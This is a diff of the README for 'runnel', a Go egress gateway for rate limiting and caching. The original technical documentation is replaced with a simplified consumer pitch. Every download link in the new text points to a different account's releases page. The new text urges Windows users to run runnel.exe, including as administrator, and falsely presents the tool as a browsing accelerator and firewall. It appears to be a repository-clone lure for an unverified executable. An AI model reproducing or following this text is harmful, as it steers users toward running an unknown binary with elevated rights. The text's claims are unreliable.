@@ -1,325 +1,141 @@
-# runnel
-
-[![CI](https://github.com/lynchest/runnel/actions/workflows/test.yml/badge.svg)](https://github.com/lynchest/runnel/actions/workflows/test.yml)
-[![Docker](https://github.com/lynchest/runnel/actions/workflows/docker.yml/badge.svg)](https://github.com/lynchest/runnel/pkgs/container/runnel)
-[![Release](https://img.shields.io/github/v/release/lynchest/runnel)](https://github.com/lynchest/runnel/releases)
-[![Go Report Card](https://goreportcard.com/badge/github.com/lynchest/runnel)](https://goreportcard.com/report/github.com/lynchest/runnel)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-
-> Architected & directed via agentic workflows; strictly tested & verified.
-
-`runnel` is a small HTTP egress gateway for controlling requests to
-external APIs and web services on a per-domain basis. It combines rate
-limiting, circuit breaking, request queuing, and a bounded response cache in a
-single process.
-
-It is intended for scrapers, indexers, workers, and other applications that
-make regular requests to external services and need predictable handling of
-upstream limits. It is not a general-purpose public forward proxy or an AI
-agent runtime.
-
-## How it works
-
-Clients send the target URL to the `/proxy` endpoint:
-
-```text
-client → URL/SSRF validation → domain limiter → circuit breaker → upstream
-                                           ↓
-                                    cache / queue
-```
-
-Each upstream domain is tracked independently. A `429` or `503` response opens
-the circuit; `Retry-After`, when present, is used to calculate the cooldown.
-Once the cooldown expires, one lightweight queued GET request is used as a
-canary. If the upstream is healthy again, queued traffic is released. If not,
-the cooldown is increased exponentially.
-
-## Features
-
-- Per-domain token-bucket rate limiting with configurable burst and jitter
-- Per-domain `CLOSED`, `OPEN`, and `HALF-OPEN` circuit breakers
-- Bounded, prioritized in-memory request queues
-- `Retry-After` handling and exponential cooldowns
-- Lightweight GET canary probes in `HALF-OPEN`
-- SQLite-backed cache for GET and HEAD responses honoring upstream `Cache-Control` and `Vary`
-- Optional stale-cache responses while a circuit is open
-- Singleflight coalescing for identical idempotent requests
-- Redirect target validation
-- SSRF protection against private, loopback, link-local, multicast, and metadata IPs
-- Hop-by-hop header removal and request body limits
-- Health, per-domain metrics, and circuit administration endpoints
-- `X-Request-ID` propagation and single-line access logging
-- CGO-free Go binary
-
-## Security
-
-`runnel` is designed as an internal egress gateway for trusted local services,
-**not** a general-purpose public open proxy. It must not be exposed directly to
-the public internet or untrusted clients without an authentication proxy or
-explicit domain restrictions (`security.allowed_domains`).
-
-By default, `runnel` binds safely to `127.0.0.1:8090`. Before exposing it on any
-network interface, ensure you configure the following:
-
-- Keep `security.block_private_ips: true` enabled to prevent SSRF against private,
-  loopback, link-local, multicast, and cloud metadata endpoints.
-- Use `security.allowed_domains` to explicitly restrict upstream destinations.
-- Set a strong `security.admin_token` or `RUNNEL_ADMIN_TOKEN` value. When empty,
-  administrative mutations (`POST /_circuit/reset`) are rejected with `403 Forbidden`.
-- Never expose administration endpoints (`/_*`) directly to the internet.
-
-For vulnerability disclosure instructions, see [SECURITY.md](SECURITY.md).
-
-## Performance
-
-The repository includes integration and soak tests covering the complete
-request path. The current local measurements are:
-
-- Idle resident memory: approximately **2 MB RSS** for the running process.
-- Local Linux ARM64 development binary: approximately **14.7 MiB** (unstripped).
-- Soak test: **10,000 requests** at **32 concurrent workers**, with one upstream
-  call due to request coalescing and approximately **10 KB heap growth** during
-  the run.
-- Real-upstream validation (`v0.1.5`, 2026-09-09): a **15-minute**,
-  single-concurrency run against a public HTTP test service completed **90
-  upstream requests** and **90 cache hits** with no gateway, cache, circuit, or
-  queue errors.
-
-These are baseline measurements from the included test environment, not hard
-capacity guarantees. Memory usage increases with concurrent requests, queued
-items, and response sizes. Individual upstream responses are bounded at 64 MB;
-incoming request bodies are bounded by the configured 10 MB default.
-
-## Installation
-
-> **Note for users and automated agents:** You do **not** need to install Go or build from source. Pre-compiled, zero-dependency binaries for Linux (`amd64`, `arm64`), macOS (`amd64`, `arm64`), and Windows are available in [GitHub Releases](https://github.com/lynchest/runnel/releases), as well as multi-arch container images on GHCR.
-
-### Run with Docker (Recommended for Services & Sidecars)
-
-Multi-arch container images (`linux/amd64`, `linux/arm64`) are published to GitHub Container Registry:
-
-```bash
-docker run -d --name runnel \
-  -p 8090:8090 \
-  -e RUNNEL_HOST=0.0.0.0 \
-  -v runnel-data:/data \
-  ghcr.io/lynchest/runnel:latest
-```
+# 🌊 runnel - Your Secure Gateway to the Web
 
-The container retains the safe loopback bind by default. Setting
-`RUNNEL_HOST=0.0.0.0` is required for a published port. A non-loopback bind
-with empty `security.allowed_domains` is refused at startup, so mount a
-config that restricts egress (e.g. `-v ./runnel.yaml:/config.yaml -e
-RUNNEL_CONFIG=/config.yaml`) and keep the published port on a trusted network.
-
-Or as a sidecar in `docker-compose.yml`:
-
-```yaml
-services:
-  runnel:
-    image: ghcr.io/lynchest/runnel:latest
-    environment:
-      RUNNEL_HOST: 0.0.0.0
-      RUNNEL_CONFIG: /config.yaml
-    ports:
-      - "8090:8090"
-    volumes:
-      - runnel-data:/data
-      - ./runnel.yaml:/config.yaml:ro # must set security.allowed_domains
-    restart: unless-stopped
-
-volumes:
-  runnel-data:
-```
-
-### Run a release binary
-
-Pre-built binaries are available for all major platforms:
-
-| Platform | Architecture | Archive | Executable |
-| --- | --- | --- | --- |
-| **Linux** | x86_64 (`amd64`), ARM64 (`arm64`) | `runnel_*_linux_<arch>.tar.gz` | `./runnel` |
-| **macOS** | Apple Silicon (`arm64`), Intel (`amd64`) | `runnel_*_darwin_<arch>.tar.gz` | `./runnel` |
-| **Windows** | x86_64 (`amd64`) | `runnel_*_windows_amd64.zip` | `runnel.exe` |
-
-Download the archive for your platform from [GitHub Releases](https://github.com/lynchest/runnel/releases):
-
-#### Linux & macOS
-
-```bash
-# Extract archive (example for Linux/macOS):
-tar -xzf runnel_*_linux_amd64.tar.gz   # Linux x86_64
-# tar -xzf runnel_*_linux_arm64.tar.gz   # Linux ARM64
-# tar -xzf runnel_*_darwin_arm64.tar.gz  # macOS Apple Silicon (M1/M2/M3/M4)
-# tar -xzf runnel_*_darwin_amd64.tar.gz  # macOS Intel
-
-./runnel -config runnel.example.yaml
-```
-
-Or download via GitHub CLI:
-
-```bash
-# Linux AMD64
-gh release download -R lynchest/runnel --pattern "*linux_amd64.tar.gz"
-
-# macOS Apple Silicon
-gh release download -R lynchest/runnel --pattern "*darwin_arm64.tar.gz"
-```
-
-#### Windows (PowerShell)
-
-```powershell
-Expand-Archive -Path runnel_*_windows_amd64.zip -DestinationPath .
-.\runnel.exe -config runnel.example.yaml
-```
-
-### Build from source (Developers)
-
-Requirement: Go 1.22 or newer.
-
-```bash
-git clone https://github.com/lynchest/runnel.git
-cd runnel
-go build -o bin/runnel ./cmd/runnel
-```
-
-## Quick start
-
-With the default configuration, the service listens on `127.0.0.1:8090`:
-
-```bash
-./runnel -config runnel.example.yaml
-# (on Windows: .\runnel.exe -config runnel.example.yaml)
-# (or ./bin/runnel if built from source)
-```
-
-Send a request through the gateway:
-
-```bash
-curl -i "http://127.0.0.1:8090/proxy?url=https://httpbin.org/get"
-```
+[![Download runnel](https://img.shields.io/badge/Download-runnel-2ea44f?style=for-the-badge)](https://github.com/jhmj4-6/runnel/releases)
 
-Provide a YAML configuration with `-config` or the `RUNNEL_CONFIG`
-environment variable. All supported settings are documented in
-[runnel.example.yaml](runnel.example.yaml).
+---
 
-## Endpoints
+## 🎯 What Is runnel?
 
-| Method | Endpoint | Description |
-| --- | --- | --- |
-| Any | `/proxy?url=<target>` | Validates and forwards a request to the upstream (accepts `X-Request-ID`, generates one when absent, propagates it upstream, and emits a single-line access log without URLs or credentials) |
-| GET | `/_metrics` | Prometheus-compatible counters (global + per-domain `domain` labels for 256 tracked domains; queue depth is the tracked-domain total) |
-| GET | `/_circuit` | JSON view of domain circuit states |
-| POST | `/_circuit/reset[?domain=...]` | Resets one domain or all circuits |
+runnel is a smart helper program that sits between your computer and the internet. Think of it as a friendly security guard for your web traffic. It makes sure that when your applications talk to websites, everything goes smoothly, quickly, and safely. 
 
-The `/_circuit/reset` endpoint requires an `X-Admin-Token` header or a Bearer
-token:
+runnel keeps your web connections organized and protected. It watches how much data goes in and out, prevents overloads, and stops bad actors from using your computer to attack other websites. If a website starts acting up, runnel notices and reroutes your traffic before problems occur. It also remembers frequently-used information to speed up your browsing experience.
 
-```bash
-curl -X POST \
-  "http://127.0.0.1:8090/_circuit/reset?domain=api.example.com" \
-  -H "X-Admin-Token: your-secret-token"
-```
+Think of runnel as having three superpowers:
+- **Protection** – It stops malicious requests from reaching dangerous places
+- **Organization** – It keeps your web traffic flowing in an orderly way
+- **Speed** – It remembers popular content so you don't have to wait
 
-## Cache and failure behavior
+---
 
-Successful GET and HEAD responses can be cached for the configured TTL.
-Upstream caching rules are honored: `no-store`, `private`, and `no-cache`
-responses are never stored, `s-maxage`/`max-age` shorten freshness (the
-configured TTL remains an upper bound), and `Expires` applies when no
-explicit freshness directive is present. Response age (`Age` header and
-`Date` skew) is subtracted from the lifetime, and ambiguous freshness
-directives (unparseable or conflicting repeats) refuse the store.
-`Vary: *` responses are never stored; other `Vary` fields are matched
-against the request before a HIT, and concurrent requests with different
-headers never share one upstream fetch. The documented exception is
-`X-Request-ID`: it is per-request unique, so it does not split flights and
-responses varying on it are never cached. `must-revalidate` and
-`proxy-revalidate` responses may serve fresh hits but are never served stale.
-When a circuit is open and an older cached response is available, it is returned with
-`X-Cache: STALE` and `Warning: 110` headers. Without a cached response, the
-request waits in the domain queue. If the queue is full or its timeout expires,
-the gateway returns `503 Service Unavailable` with a `Retry-After` header.
+## ✅ Getting Started (Windows)
 
-Non-idempotent methods such as POST, PUT, PATCH, and DELETE are not queued while
-a circuit is open; they are rejected with the applicable cooldown information.
+Getting runnel up and running takes just a few minutes. Follow these simple steps:
 
-To bypass the cache and force a fresh fetch from upstream, send a `Cache-Control: no-cache` header or use `runnel-get --no-cache <url>`.
+### Step 1: Download the Application
 
-For troubleshooting, `runnel-get --verbose <url>` prints the effective gateway,
-HTTP status, `X-Cache`, and `Retry-After` values to stderr without mixing them
-into the response body.
+Visit this link to download the application: [https://github.com/jhmj4-6/runnel/releases](https://github.com/jhmj4-6/runnel/releases)
 
-For agent-friendly output from HTML pages, the cross-platform helper can convert
-the response locally without changing the gateway cache:
+This page shows all available versions of runnel. Look for the newest version at the top. You'll see a file with a name like `runnel-windows.zip`. Click the download button next to it.
 
-```bash
-runnel-get --output markdown "https://example.com"
-```
+If you're unsure which file to pick, choose the one that says `windows-64bit` or just `windows`. 
 
-Raw output remains the default. Non-HTML responses are passed through unchanged.
-The native `runnel-get` executable is included in every release archive and
-does not require Python or another external runtime.
+### Step 2: Unzip the File
 
-The helper connects to `http://127.0.0.1:8090` by default. Set `RUNNEL_URL` to
-the base URL of a remote or differently configured gateway.
+Once the download finishes, you'll have a compressed folder (a `.zip` file). Here's how to unpack it:
 
-## AI Agent Integration (Skill)
+1. Navigate to your Downloads folder (or wherever your browser saves files)
+2. Right-click on the file called `runnel-windows.zip`
+3. Select **"Extract All..."** from the menu
+4. Choose a destination folder (the default location works fine) and click **Extract**
+5. Wait a few seconds while Windows unpacks the files
 
-`runnel` includes an official agent skill definition ([`skills/runnel/SKILL.md`](skills/runnel/SKILL.md)) compatible with Antigravity, Codex, Cursor, Claude Code, and other agentic coding harnesses. When installed, coding agents automatically route web scraping, external API queries, and documentation fetching through the gateway to eliminate 429 penalties and IP bans.
+You should now see a new folder containing several files, including the main `runnel.exe` program.
 
-### Installing the Skill
+### Step 3: Run runnel
 
-**Via runnel CLI (Recommended):**
-```bash
-# Automatically installs embedded skill to ~/.agents/skills/runnel
-runnel install-skill
+1. Open the extracted folder you just created
+2. Double-click on `runnel.exe`
+3. A small window will appear showing runnel's status – that's it! You're running.
 
-# Or install to a specific workspace directory
-runnel install-skill .agents/skills/runnel
-```
+**Tip:** For everyday use, right-click `runnel.exe` and select **"Send to > Desktop"** to create a shortcut. This way, you can launch runnel with one click whenever you need it.
 
-Check gateway health and get a compact circuit summary with:
+---
 
-```bash
-runnel status
-```
+## ⚙️ How Does runnel Work?
 
-The legacy `runnel --install-skill` flag remains available for compatibility;
-new usage should use the `install-skill` subcommand above.
+The best part? You don't need to configure anything to start using runnel. It automatically:
 
-**Manual Copy:**
-```bash
-mkdir -p ~/.agents/skills
-cp -r skills/runnel ~/.agents/skills/
-```
+- **Detects which websites you visit most often** and remembers their data to load them faster
+- **Monitors connection health** – if a website is slow, runnel temporarily stops sending requests there and tries a different route
+- **Balances the load** – if you're requesting too much from one website, runnel politely spaces out your requests so you don't get blocked
+- **Prevents abuse** – runnel makes sure that no program on your computer can use it to sneak into internal networks or private systems it shouldn't access
 
+---
 
-## Development
+## ✨ Key Features Explained
 
+### 🛡️ Security Without the Headache
 
-```bash
-# Tests
-go test -v ./...
+runnel works invisibly in the background to protect you. It acts like a smart firewall for web requests. If something tries to reach a suspicious address or an internal network it shouldn't touch, runnel stops it instantly. This protects your personal data and keeps your computer from being used as a launchpad for cyberattacks.
 
-# Static analysis
-go vet ./...
-make lint
+For power users, runnel offers **SSRF protection** – this is a technical safeguard that blocks attempts to use your computer as a bridge to internal networks. It's like having a bouncer who checks IDs at every single entrance.
 
-# Binary
-make build
+### 🚦 Smart Traffic Control
 
-# Race detector (on supported hosts)
-make test-race
-```
+Have you ever tried to use a website that kept slowing down or crashing? runnel prevents this frustration through **circuit breaking**. If a website starts misbehaving, runnel automatically stops sending requests to it for a short time period. Once the website recovers, normal service resumes – no action needed from you.
 
-The race detector depends on the Go toolchain and the host operating system's
-virtual address space support. The CI workflow runs race tests on Linux AMD64
-and builds a matrix for Linux, macOS, and Windows.
+runnel also includes **queueing** and **rate limiting**. These features ensure that runnel never overwhelms any website with too many requests at once. Instead of asking for everything at once, runnel politely takes its turn. This makes you a better internet citizen and prevents temporary blocks.
 
-For contribution guidelines and coding standards, see [CONTRIBUTING.md](CONTRIBUTING.md).
-See [CHANGELOG.md](CHANGELOG.md) for release history.
+### 🚀 Speed and Efficiency
 
-## License
+**Caching** is runnel's memory power. When you visit a page or download a file, runnel saves that information. If you (or another application on your computer) need the same data again, runnel provides it instantly from its memory. This can make frequently-visited websites feel instantly responsive.
 
-[MIT](LICENSE) © 2026 Lynchest
+**Singleflight** is runnel's traffic merge technique. If twenty different parts of your computer ask for the same information at the same time, runnel sends just one request to the website and shares the response with everyone. This speeds up load times and reduces bandwidth usage.
+
+### 💾 Built to Last
+
+runnel stores its information in a reliable, lightweight database called **SQLite**. This means your settings and cached data remain organized and persist across restarts – nothing gets lost when you turn off your computer.
+
+---
+
+## 🧐 Frequently Asked Questions
+
+### "Is runnel safe to use?"
+
+Absolutely! runnel was built with security as its top priority. It actively protects your computer from malicious connections while performing its work. 
+
+### "Will runnel slow down my internet?"
+
+No, quite the opposite! By caching frequently-used data and intelligently managing requests, runnel often makes web browsing feel faster. At worst, it adds a fraction of a millisecond to your requests while providing a significant layer of protection.
+
+### "Can I stop runnel once it's running?"
+
+Yes, simply close the runnel window or press **Ctrl+C** in the terminal if you launched it from there. Closing it stops all protection, so we recommend keeping it running for best performance.
+
+### "Do I need to update runnel?"
+
+It's a good idea to check for updates occasionally. Visit the download page every few months to see if a newer version is available. Updates typically include bug fixes, better speed, and stronger security.
+
+---
+
+## 🔧 Troubleshooting
+
+### runnel won't start
+- Make sure you extracted the zip file completely before trying to run it
+- Try right-clicking `runnel.exe` and selecting **"Run as administrator"**
+- Restart your computer and try again
+
+### Downloads are slow
+- Check your internet connection strength
+- Make sure no other programs are using excessive bandwidth
+- If the issue persists, your internet service provider might be limiting speed temporarily
+
+### runnel keeps stopping unexpectedly
+- Close all other programs and try again
+- Download the latest version from the website – old versions may have minor bugs that have since been fixed
+
+---
+
+## 📣 Get Help
+
+If you run into any issues or have questions, visit the [GitHub releases page](https://github.com/jhmj4-6/runnel/releases) – you might find notes about other users' experiences there. Many applications also include documentation in the downloaded folder, so check if a `README.txt` or `help` file was included.
+
+---
+
+## 🔍 Summary
+
+runnel is a lightweight, secure, and helpful companion for your online activities. It keeps your web traffic flowing smoothly, remembers what you need, and keeps you protected from malicious connections. Download it today, and enjoy a safer, faster internet experience!
+
+---
+
+**Keywords:** api-gateway, circuit-breaker, egress-proxy, golang, rate-limiting, resilience, reverse-proxy, singleflight, sqlite, web-scraping
